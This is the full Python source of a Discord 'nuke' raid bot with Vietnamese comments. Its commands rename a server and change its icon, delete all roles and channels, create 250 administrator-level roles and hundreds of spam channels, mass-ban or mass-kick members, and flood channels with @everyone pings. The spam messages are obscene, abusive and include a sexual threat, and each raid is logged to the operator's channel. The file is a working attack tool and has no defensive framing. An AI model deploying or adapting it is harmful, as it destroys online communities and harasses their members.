import random
import discord
from discord.ext import commands
import asyncio
from discord import app_commands
import aiohttp

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)

TOKEN = "" 

MESSAGE_CONTENT = """# eh sever lồn nào đây sao bị nuke rồi? [zyo](https://zyo.lol/trnnz.08)"""

MESSAGES_PER_CHANNEL = 300
NEW_SERVER_NAME = "sever ai v?"
NEW_CHANNEL_NAME = "Đúng Cái Sever Lồn"
CHANNEL_COUNT = 300

# Tên và số lượng role mới sẽ được spam tạo ra để làm đầy server (Discord giới hạn tối đa 250 role)
NEW_ROLE_NAME = "Raided by Vawn"
ROLE_COUNT = 250

# Link ảnh avatar mới cho server khi nuke (Bạn có thể thay đổi link ảnh tùy ý ở đây)
NEW_SERVER_ICON_URL = "https://media.discordapp.net/attachments/1524861695561040145/1526959030915039423/anh-dong-anime-de-thuong_103358959.png"

LOG_CHANNEL_ID = 1472872425594159217         # <-- ID Kênh Discord dùng để nhận Log khi lệnh được chạy
WHITELISTED_SERVERS = []          # <-- Danh sách ID các Server được bảo vệ (Bot sẽ không chạy lệnh phá trên các server này)
ADMIN_IDS = [1474457819469185156]         # <-- Danh sách Discord User ID của các Admin có quyền dùng lệnh quản lý bot
active_servers = set()

def is_owner_admin(user_id):
    return user_id in ADMIN_IDS

def is_whitelisted(guild_id):
    return guild_id in WHITELISTED_SERVERS

@bot.event
async def on_ready():
    activity = discord.Activity(type=discord.ActivityType.playing, name=".help | vawn")
    await bot.change_presence(status=discord.Status.online, activity=activity)
    await bot.tree.sync()
    print(f"Bot đã online: {bot.user}")

async def send_logs(ctx, command_name):
    try:
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            member_count = ctx.guild.member_count if ctx.guild else 0
            messages = [msg async for msg in log_channel.history(limit=None)]
            log_count = len(messages) + 1
            embed = discord.Embed(title="Logs Use in The Bot", color=discord.Color.red())
            embed.add_field(name="**User:**", value=f"{ctx.author} ({ctx.author.id})", inline=False)
            embed.add_field(name="**Server:**", value=f"{ctx.guild.name} ({ctx.guild.id})" if ctx.guild else "User Install", inline=False)
            embed.add_field(name="**Members:**", value=f"{member_count}", inline=False)
            embed.add_field(name="**Total Nuke:**", value=f"{log_count}", inline=False)
            embed.add_field(name="**Command:**", value=command_name, inline=False)
            await log_channel.send(embed=embed)
    except:
        pass

@bot.hybrid_command(name="help")
@app_commands.allowed_installs(guilds=True, users=True)
async def help_command(ctx):
    await ctx.defer(ephemeral=False)
    embed = discord.Embed(title="Bot Commands Guide", color=discord.Color.dark_teal())
    embed.add_field(name="Lệnh | Commands", value=(
        "**.help** - Show this help message\n"
        "**.ping** - Check ping of bot\n"
        "**.nuke** - Nuke server cơ bản\n"
        "**.nukencreatenbanall** - Xóa role -> Tạo role full quyền -> Nuke sv + Ban all mem\n"
        "**/nukechat** - Spam chat (User Install)\n"
        "**.spam <số_lượng> <nội_dung>** - Spam tin nhắn\n"
        "**.ban** - Ban all members\n"
        "**.kick** - Kick all members\n"
        "**.rolelist** - Display the list of roles\n"
        "**.delchannel** - Delete all channels\n"
        "**.createrole** - Delete old roles & Create new full roles\n"
        "**.createchannel** - Create new channels\n"
        "**.check** - Check all servers bot is in\n\n"
        "**Quản lý:**\n"
        "**.add <user_id>** - Thêm admin\n"
        "**.addsv <server_id>** - Thêm server vào whitelist"
    ), inline=False)
    embed.set_image(url="https://media.discordapp.net/attachments/1524861695561040145/1526959030915039423/anh-dong-anime-de-thuong_103358959.png?ex=6a58eaea&is=6a57996a&hm=71ce11e9cda8a6a3f2f37b9ef4fee965fab740708f07941fb9be53f8f81abbcd&=&format=webp&quality=lossless&width=1295&height=688")
    embed.set_footer(text="by vawn")
    await ctx.send(embed=embed)

@bot.hybrid_command(name="ping")
@app_commands.allowed_installs(guilds=True, users=True)
async def ping(ctx):
    await ctx.defer(ephemeral=False)
    latency = round(bot.latency * 1000)
    await ctx.send(f'Ping của bot là {latency}ms')

@bot.command()
async def add(ctx, user_id: int = None):
    if not is_owner_admin(ctx.author.id):
        await ctx.send("Có quyền đéo đâu mà dùng thg nguu")
        return
    if user_id is None:
        await ctx.send("Cách dùng: .add <user_id>")
        return
    if user_id in ADMIN_IDS:
        await ctx.send("Người này đã là admin rồi")
        return
    ADMIN_IDS.append(user_id)
    await ctx.send(f"Đã thêm {user_id} vào danh sách admin")

@bot.command()
async def addsv(ctx, server_id: int = None):
    if not is_owner_admin(ctx.author.id):
        await ctx.send("Bạn không có quyền dùng lệnh này")
        return
    if server_id is None:
        await ctx.send("Cách dùng: .addsv <server_id>")
        return
    if server_id in WHITELISTED_SERVERS:
        await ctx.send("Tao whitelist rồi mà mày làm cc gì vậy?")
        return
    WHITELISTED_SERVERS.append(server_id)
    await ctx.send(f"Đã thêm server {server_id} vào whitelist")

@bot.command()
async def check(ctx):
    if not is_owner_admin(ctx.author.id):
        await ctx.send("Có quyền đéo đâu mà dùng")
        return
    if not bot.guilds:
        await ctx.send("Bot hiện không ở server nào")
        return
    embed = discord.Embed(title="Danh sách Server Bot Đang Tham Gia", color=discord.Color.blue())
    embed.description = f"Tổng số server: {len(bot.guilds)}\n\n"
    for guild in bot.guilds:
        embed.add_field(
            name=f"{guild.name}",
            value=f"ID: {guild.id}\nThành viên: {guild.member_count}\nWhitelist: {'Có' if is_whitelisted(guild.id) else 'Không'}",
            inline=False
        )
    await ctx.send(embed=embed)

@bot.command()
async def nuke(ctx):
    if not ctx.guild:
        await ctx.send("Lệnh .nuke chỉ dùng khi bot đã vào server")
        return
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Tao whitelist rồi mà mày làm cc gì vậy?")
        return
    guild_id = ctx.guild.id
    if guild_id in active_servers:
        await ctx.send("Lệnh đang chạy trên server này rồi")
        return

    active_servers.add(guild_id)
    try:
        await send_logs(ctx, "nuke")
        
        # 1. Tự động đổi tên và đổi avatar server
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(NEW_SERVER_ICON_URL) as resp:
                    if resp.status == 200:
                        icon_bytes = await resp.read()
                        await ctx.guild.edit(name=NEW_SERVER_NAME, icon=icon_bytes)
                    else:
                        await ctx.guild.edit(name=NEW_SERVER_NAME)
        except:
            try:
                await ctx.guild.edit(name=NEW_SERVER_NAME)
            except:
                pass

        # 2. Xóa toàn bộ role cũ có thể xóa được
        delete_role_tasks = [role.delete() for role in ctx.guild.roles if role != ctx.guild.default_role and role < ctx.guild.me.top_role]
        await asyncio.gather(*delete_role_tasks, return_exceptions=True)

        # 3. Tạo hàng loạt role mới với full quyền cho đến khi đầy server (250 role)
        create_role_tasks = [ctx.guild.create_role(name=f"{NEW_ROLE_NAME}-{i}", permissions=discord.Permissions.all()) for i in range(1, ROLE_COUNT + 1)]
        await asyncio.gather(*create_role_tasks, return_exceptions=True)

        # 4. Xóa toàn bộ kênh cũ
        delete_tasks = [channel.delete() for channel in ctx.guild.channels if channel != ctx.channel]
        await asyncio.gather(*delete_tasks, return_exceptions=True)

        try:
            await ctx.channel.delete()
        except:
            pass

        # 5. Tạo các kênh chat mới và spam tin nhắn
        create_tasks = [ctx.guild.create_text_channel(name=NEW_CHANNEL_NAME) for _ in range(CHANNEL_COUNT)]
        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
        channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]

        async def send_messages(channel):
            for _ in range(MESSAGES_PER_CHANNEL):
                try:
                    await channel.send(f"{MESSAGE_CONTENT}")
                except:
                    break

        message_tasks = [send_messages(ch) for ch in channels]
        await asyncio.gather(*message_tasks, return_exceptions=True)
    finally:
        active_servers.discard(guild_id)

@bot.command()
async def nukencreatenbanall(ctx):
    if not ctx.guild:
        await ctx.send("Lệnh này chỉ dùng trong server")
        return
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Tao whitelist rồi mà mày làm cc gì vậy?")
        return
    guild_id = ctx.guild.id
    if guild_id in active_servers:
        await ctx.send("Lệnh đang chạy trên server này rồi")
        return

    active_servers.add(guild_id)
    try:
        await send_logs(ctx, "nukencreatenbanall")

        # 1. Đổi tên và avatar server
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(NEW_SERVER_ICON_URL) as resp:
                    if resp.status == 200:
                        icon_bytes = await resp.read()
                        await ctx.guild.edit(name=NEW_SERVER_NAME, icon=icon_bytes)
                    else:
                        await ctx.guild.edit(name=NEW_SERVER_NAME)
        except:
            try:
                await ctx.guild.edit(name=NEW_SERVER_NAME)
            except:
                pass

        # 2. Xóa role cũ và tạo role mới full quyền ngay lập tức
        delete_role_tasks = [role.delete() for role in ctx.guild.roles if role != ctx.guild.default_role and role < ctx.guild.me.top_role]
        await asyncio.gather(*delete_role_tasks, return_exceptions=True)

        create_role_tasks = [ctx.guild.create_role(name=f"{NEW_ROLE_NAME}-{i}", permissions=discord.Permissions.all()) for i in range(1, ROLE_COUNT + 1)]
        await asyncio.gather(*create_role_tasks, return_exceptions=True)

        # 3. Tiến hành Ban toàn bộ thành viên
        for member in ctx.guild.members:
            if member != ctx.guild.owner and not member.bot:
                try:
                    await member.ban(reason="Server Raided by Vawn")
                except:
                    pass

        # 4. Xóa toàn bộ kênh cũ
        delete_tasks = [channel.delete() for channel in ctx.guild.channels if channel != ctx.channel]
        await asyncio.gather(*delete_tasks, return_exceptions=True)

        try:
            await ctx.channel.delete()
        except:
            pass

        # 5. Tạo kênh mới và spam tin nhắn nuke
        create_tasks = [ctx.guild.create_text_channel(name=NEW_CHANNEL_NAME) for _ in range(CHANNEL_COUNT)]
        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
        channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]

        async def send_messages(channel):
            for _ in range(MESSAGES_PER_CHANNEL):
                try:
                    await channel.send(f"{MESSAGE_CONTENT}")
                except:
                    break

        message_tasks = [send_messages(ch) for ch in channels]
        await asyncio.gather(*message_tasks, return_exceptions=True)
    finally:
        active_servers.discard(guild_id)

@bot.hybrid_command(name="nukechat")
@app_commands.allowed_installs(guilds=True, users=True)
async def nukechat(ctx):
    if ctx.guild:
        if is_whitelisted(ctx.guild.id):
            await ctx.send("Tao whitelist rồi mà mày làm cc gì vậy?", ephemeral=True)
            return

    await ctx.defer(ephemeral=False)
    spam_message = "# SV NÀY ĐÃ BỊ NUKE BỞI VAWN CỦA DMX BỐ MẤY CÁI THẰNG NGUU ẢO MẠNG TRONG MÀY CÓ TẬT LỒN ÔNG BÀ GIÀ MÀY CHẾT CHƯA MÀ MÀY LÊN MẠNG XẠO LỒN VỚI ANH ĐẾN LÚC ANH PHÁ THÌ NHẢY ĐÀNH ĐẠCH NHƯ CON CHÓ COI ANH MÀY ĐÈ HIẾP CHẾT CON ĐĨ MEJ MÀY NGHE CHƯA SEVER LỒN SEVER RÁC ANH MÀY GIẾT MẤY CÁI LŨ SEVER NGUU NHƯ BỌN BÂY [Zyo](https://zyo.lol/trnnz.08) || @everyone ||  || @here || "
    
    try:
        for i in range(80):
            await ctx.send(f"{spam_message}")
    except Exception:
        pass

@bot.command()
async def ban(ctx, *, reason: str = "Server Raided by Vawn"):
    if not ctx.guild:
        await ctx.send("Lệnh này chỉ dùng trong server")
        return
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Tao whitelist rồi mà mày làm cc gì vậy?")
        return
    for member in ctx.guild.members:
        if member != ctx.guild.owner and not member.bot:
            try:
                try:
                    await member.send(f"Bị Anh Vawn ban ra khỏi sever rồi cay k {ctx.guild.name}")
                except:
                    pass
                await member.ban(reason=reason)
            except:
                pass
    await ctx.send("Đã xử lý xong massban")

@bot.command()
async def kick(ctx, *, reason: str = "Server Raided by Vawn"):
    if not ctx.guild:
        await ctx.send("Lệnh này chỉ dùng trong server")
        return
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Tao whitelist rồi mà mày làm cc gì vậy?")
        return
    for member in ctx.guild.members:
        if member != ctx.guild.owner and not member.bot:
            try:
                try:
                    await member.send(f"Bị vawn kick rồi kìa baby {ctx.guild.name}")
                except:
                    pass
                await member.kick(reason=reason)
            except:
                pass
    await ctx.send("Đã xử lý xong masskick")

@bot.command()
async def delchannel(ctx):
    if not ctx.guild:
        await ctx.send("Lệnh này chỉ dùng trong server")
        return
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Tao whitelist rồi mà mày làm cc gì vậy?")
        return
    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

@bot.command()
async def createrole(ctx):
    if not ctx.guild:
        await ctx.send("Lệnh này chỉ dùng trong server")
        return
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Tao whitelist rồi mà mày làm cc gì vậy?")
        return
    
    # 1. Xóa toàn bộ role cũ trước
    delete_role_tasks = [role.delete() for role in ctx.guild.roles if role != ctx.guild.default_role and role < ctx.guild.me.top_role]
    await asyncio.gather(*delete_role_tasks, return_exceptions=True)

    # 2. Tạo full role mới (250 role) kèm full quyền Administrator
    create_tasks = [ctx.guild.create_role(name=f"Raided by Vawn-{i}", permissions=discord.Permissions.all()) for i in range(1, 251)]
    await asyncio.gather(*create_tasks, return_exceptions=True)
    await ctx.send("Đã xóa role cũ, tạo đầy danh sách role mới và cấp full quyền thành công!")

@bot.command()
async def createchannel(ctx):
    if not ctx.guild:
        await ctx.send("Lệnh này chỉ dùng trong server")
        return
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Tao whitelist rồi mà mày làm cc gì vậy?")
        return
    base_name = "Server Raided by qbao"
    created = 0
    for i in range(1, 101):
        try:
            await ctx.guild.create_text_channel(name=f"{base_name}-{i}")
            created += 1
        except:
            pass

@bot.command()
async def rolelist(ctx):
    if not ctx.guild:
        await ctx.send("Lệnh này chỉ dùng trong server")
        return
    guild = ctx.guild
    roles = sorted(guild.roles, key=lambda r: r.position, reverse=True)
    role_mentions = [role.mention for role in roles if role.name != "@everyone"]

    chunk_size = 200
    current_chunk = ""
    for role in role_mentions:
        if len(current_chunk) + len(role) + 1 > chunk_size:
            embed = discord.Embed(title="ROLE LIST", color=discord.Color.blue())
            embed.add_field(name="VAWN DEVELOPMENT", value=current_chunk, inline=False)
            await ctx.send(embed=embed)
            current_chunk = ""
        current_chunk += role + "\n"

    if current_chunk:
        embed = discord.Embed(title="ROLE LIST", color=discord.Color.blue())
        embed.add_field(name="VAWN DEVELOPMENT", value=current_chunk, inline=False)
        await ctx.send(embed=embed)

@bot.hybrid_command(name="spam")
@app_commands.allowed_installs(guilds=True, users=True)
async def spam(ctx, amount: int = None, *, message: str = None):
    await ctx.defer(ephemeral=False)
    if not amount or not message:
        await ctx.send("Cách dùng: .spam <số_lượng> <nội_dung>")
        return
    if ctx.guild and is_whitelisted(ctx.guild.id):
        await ctx.send("Tao whitelist rồi mà mày làm cc gì vậy?")
        return
    if ctx.guild and ctx.guild.id in active_servers:
        await ctx.send("Lệnh đang chạy trên server này rồi")
        return

    if ctx.guild:
        active_servers.add(ctx.guild.id)
    try:
        async def send_messages(channel):
            for _ in range(amount):
                try:
                    await channel.send(f"{message}")
                except:
                    break

        if ctx.guild:
            text_channels = [ch for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
            tasks = [send_messages(ch) for ch in text_channels]
            await asyncio.gather(*tasks, return_exceptions=True)
        else:
            for _ in range(min(amount, 60)):
                await ctx.send(f"{message}")
    finally:
        if ctx.guild:
            active_servers.discard(ctx.guild.id)

bot.run(TOKEN)
